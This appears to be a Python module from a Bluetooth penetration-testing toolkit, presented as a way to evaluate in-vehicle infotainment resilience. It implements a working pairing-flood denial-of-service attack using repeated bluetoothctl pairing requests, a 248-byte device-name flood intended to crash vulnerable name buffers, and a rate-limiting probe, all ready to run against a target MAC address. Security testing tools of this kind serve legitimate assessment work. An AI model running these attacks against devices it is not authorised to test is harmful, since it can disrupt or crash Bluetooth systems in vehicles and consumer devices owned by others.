"""Pairing Flood DoS attack against Bluetooth targets.

Sends rapid pairing requests to overwhelm a target device's pairing state
machine. Can detect rate limiting and test memory exhaustion via long name
floods. Useful for evaluating IVI resilience to pairing-based denial of
service.

Attack variants:
  - Pairing flood: rapid-fire pairing requests via bluetoothctl
  - Long name flood: set adapter name to max length (248 bytes), attempt pair
  - Rate limit detection: time successive attempts to detect backoff
"""

import random
import subprocess
import time

from bt_tap.utils.bt_helpers import run_cmd
from bt_tap.utils.output import info, success, error, warning


class PairingFlood:
    """Pairing-based denial of service against Bluetooth targets.

    Usage:
        flood = PairingFlood("AA:BB:CC:DD:EE:FF")
        result = flood.flood_pairing_requests(count=100, interval=0.2)
        print(result)
    """

    def __init__(self, address: str, hci: str = "hci0"):
        self.address = address
        self.hci = hci

    def flood_pairing_requests(self, count: int = 50, interval: float = 0.5) -> dict:
        """Send rapid pairing requests to overwhelm the target.

        Each iteration removes any existing pairing, then immediately attempts
        a new pair via bluetoothctl. The flood effect comes from the volume and
        speed of requests, not MAC spoofing.

        Args:
            count: Number of pairing attempts to send.
            interval: Delay in seconds between attempts.

        Returns:
            Summary dict with attempt counts and timing.
        """
        info(f"Starting pairing flood against {self.address} ({count} attempts)")

        successful = 0
        failed = 0
        errors = []
        start_time = time.time()

        for i in range(count):
            info(f"Attempt {i + 1}/{count}")

            # Remove existing pairing to force fresh negotiation each time
            run_cmd(["bluetoothctl", "remove", self.address], timeout=5)
            time.sleep(0.1)

            # Attempt pairing via bluetoothctl stdin
            bt_commands = f"pair {self.address}\nquit\n"
            try:
                result = subprocess.run(
                    ["bluetoothctl"],
                    input=bt_commands,
                    capture_output=True,
                    text=True,
                    timeout=10,
                    errors="replace",
                )
                output = result.stdout + result.stderr
                if "Pairing successful" in output:
                    successful += 1
                    success(f"  Attempt {i + 1}: paired")
                else:
                    failed += 1
                    if "Failed" in output or "error" in output.lower():
                        short = output.strip().splitlines()[-1] if output.strip() else "unknown"
                        errors.append(short)
            except subprocess.TimeoutExpired:
                failed += 1
                warning(f"  Attempt {i + 1}: timed out")
                errors.append("timeout")

            if interval > 0:
                time.sleep(interval)

        elapsed = time.time() - start_time
        summary = {
            "target": self.address,
            "total_attempts": count,
            "successful": successful,
            "failed": failed,
            "elapsed_seconds": round(elapsed, 2),
            "rate_per_second": round(count / elapsed, 2) if elapsed > 0 else 0,
            "unique_errors": list(set(errors)),
        }

        info(f"Flood complete: {successful} paired, {failed} failed in {elapsed:.1f}s")
        return summary

    def long_name_flood(self, name_length: int = 248) -> dict:
        """Set adapter name to max-length string and attempt pairing.

        Tests whether the target properly handles oversized device names.
        Some devices allocate fixed buffers for remote names and may crash
        or behave unexpectedly with 248-byte names.

        Args:
            name_length: Length of the device name to set (max 248 per BT spec).

        Returns:
            Summary dict with result.
        """
        name_length = min(name_length, 248)
        long_name = "A" * name_length

        # Save original name for restore
        original_name_result = run_cmd(["hciconfig", self.hci, "name"], timeout=5)
        original_name = ""
        if original_name_result.returncode == 0:
            for line in original_name_result.stdout.splitlines():
                if "Name:" in line:
                    original_name = line.split(":", 1)[1].strip().strip("'\"")
                    break

        info(f"Setting adapter name to {name_length} bytes")
        run_cmd(["sudo", "hciconfig", self.hci, "name", long_name], timeout=5)

        # Bring adapter up and attempt pairing
        run_cmd(["sudo", "hciconfig", self.hci, "up"], timeout=5)
        run_cmd(["sudo", "hciconfig", self.hci, "piscan"], timeout=5)

        bt_commands = f"remove {self.address}\npair {self.address}\nquit\n"
        try:
            result = subprocess.run(
                ["bluetoothctl"],
                input=bt_commands,
                capture_output=True,
                text=True,
                timeout=15,
                errors="replace",
            )
            output = result.stdout + result.stderr
            paired = "Pairing successful" in output
        except subprocess.TimeoutExpired:
            output = "timeout"
            paired = False

        status = "paired" if paired else "rejected_or_timeout"
        if paired:
            success(f"Long name pairing succeeded ({name_length} bytes)")
        else:
            warning(f"Long name pairing failed/rejected ({name_length} bytes)")

        # Restore original adapter name
        if original_name:
            run_cmd(["sudo", "hciconfig", self.hci, "name", original_name], timeout=5)
            info(f"Restored adapter name to '{original_name}'")

        return {
            "target": self.address,
            "name_length": name_length,
            "status": status,
            "output": output.strip()[:500],
        }

    def detect_rate_limiting(self, attempts: int = 10) -> dict:
        """Time successive pairing attempts to detect rate limiting.

        Sends pairing requests back-to-back and measures the time each one
        takes. If the target implements rate limiting, later attempts will
        take progressively longer or fail.

        Args:
            attempts: Number of pairing attempts for detection.

        Returns:
            Dict with per-attempt timings and rate limiting verdict.
        """
        info(f"Detecting rate limiting on {self.address} ({attempts} attempts)")

        timings = []

        for i in range(attempts):
            run_cmd(["bluetoothctl", "remove", self.address], timeout=5)
            time.sleep(0.1)

            bt_commands = f"pair {self.address}\nquit\n"
            t_start = time.time()
            try:
                subprocess.run(
                    ["bluetoothctl"],
                    input=bt_commands,
                    capture_output=True,
                    text=True,
                    timeout=15,
                    errors="replace",
                )
            except subprocess.TimeoutExpired:
                pass
            t_elapsed = time.time() - t_start
            timings.append(round(t_elapsed, 3))
            info(f"  Attempt {i + 1}: {t_elapsed:.3f}s")

        # Detect rate limiting: check if later attempts are significantly slower
        rate_limited = False
        if len(timings) >= 4:
            first_half = sum(timings[: len(timings) // 2]) / (len(timings) // 2)
            second_half = sum(timings[len(timings) // 2 :]) / (len(timings) - len(timings) // 2)
            # If second half is >2x slower, likely rate limited
            if second_half > first_half * 2 and first_half > 0:
                rate_limited = True
                warning("Rate limiting detected: later attempts significantly slower")
            else:
                info("No obvious rate limiting detected")

        return {
            "target": self.address,
            "attempts": attempts,
            "timings": timings,
            "rate_limited": rate_limited,
            "avg_time": round(sum(timings) / len(timings), 3) if timings else 0,
        }
